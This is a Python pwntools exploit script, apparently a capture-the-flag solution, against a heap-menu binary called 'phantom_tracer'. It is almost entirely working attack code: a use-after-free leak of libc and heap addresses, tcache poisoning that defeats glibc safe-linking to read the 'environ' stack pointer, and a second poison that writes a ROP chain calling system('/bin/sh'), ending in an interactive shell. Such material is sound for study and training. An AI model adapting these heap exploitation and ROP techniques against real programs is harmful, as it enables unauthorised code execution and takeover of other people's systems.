from pwn import *

elf = ELF('./phantom_tracer')
libc = ELF('./libc.so')
context.binary = elf

def start():
    if args.GDB: return gdb.debug(elf.path, gdbscript='b *main+565\nc')
    return process(elf.path)

io = start()

def add(size):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b'Strength:', str(size).encode())

def edit(idx, data):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'Index:', str(idx).encode())
    io.sendafter(b'Pattern:', data)

def delete(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'Index:', str(idx).encode())

def view(idx, size):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'Index:', str(idx).encode())
    io.recvuntil(b'recovered:\n')
    return io.recvn(size)

def mangle(pos, ptr):
    return (pos >> 12) ^ ptr

# --- 1. LEAK LIBC & HEAP ---
log.info("Leaking Libc and Heap...")
add(0x420) # idx 0
add(0x20)  # idx 1
delete(0)
libc_leak = u64(view(0, 0x420)[:6].ljust(8, b'\x00'))
libc.address = libc_leak - 0x203b20 # Use your verified offset
log.success(f"Libc Base: {hex(libc.address)}")

delete(1)
heap_key = u64(view(1, 0x20)[:6].ljust(8, b'\x00'))
heap_base = heap_key << 12
log.success(f"Heap Base: {hex(heap_base)}")

# --- 2. LEAK STACK (Environ) ---
log.info("Poisoning Tcache for Stack Leak...")
size_a = 0x60
add(size_a) # idx 2
add(size_a) # idx 3
delete(3)
delete(2)

# pos_idx2 should be at heap_base + 0x470 (Check with 'heap' in GDB)
pos_idx2 = heap_base + 0x470 
target_env = libc.symbols['environ'] & ~0xf

edit(2, p64(mangle(pos_idx2, target_env)).ljust(size_a, b"\x00"))

add(size_a) # idx 4
add(size_a) # idx 5 (At environ & ~0xf)

stack_data = view(5, size_a)
# environ is at offset 0 or 8 depending on the &~0xf alignment
# If environ ended in 0, it's at offset 0. If it ended in 8, it's at offset 8.
stack_leak = u64(stack_data[8:16]) if (libc.symbols['environ'] % 16 != 0) else u64(stack_data[:8])
log.success(f"Stack Leak (environ): {hex(stack_leak)}")

# --- 3. ROP CHAIN ---
log.info("Poisoning Tcache for ROP Chain...")
target_rip = (stack_leak - 0x990) & ~0xf
size_b = 0x70
add(size_b) # idx 6
add(size_b) # idx 7
delete(7)
delete(6)

# pos_idx6 should be at heap_base + 0x5b0
pos_idx6 = heap_base + 0x5b0 
edit(6, p64(mangle(pos_idx6, target_rip)).ljust(size_b, b"\x00"))

add(size_b) # idx 8
add(size_b) # idx 9 (At Saved RIP area)

rop = ROP(libc)
POP_RDI = rop.find_gadget(['pop rdi', 'ret'])[0]
RET = rop.find_gadget(['ret'])[0]

# Padding: If target_rip was stack_leak-0x990 (which ends in 8) 
# but we targeted &~0xf, we need 8 bytes of padding.
chain = b"A" * 8 + flat([
    RET, 
    POP_RDI,
    next(libc.search(b"/bin/sh\x00")),
    libc.symbols['system']
])
edit(9, chain.ljust(size_b, b"\x00"))

# --- 4. TRIGGER ---
log.info("Triggering Shell...")
io.sendlineafter(b'>', b'5') 
io.interactive()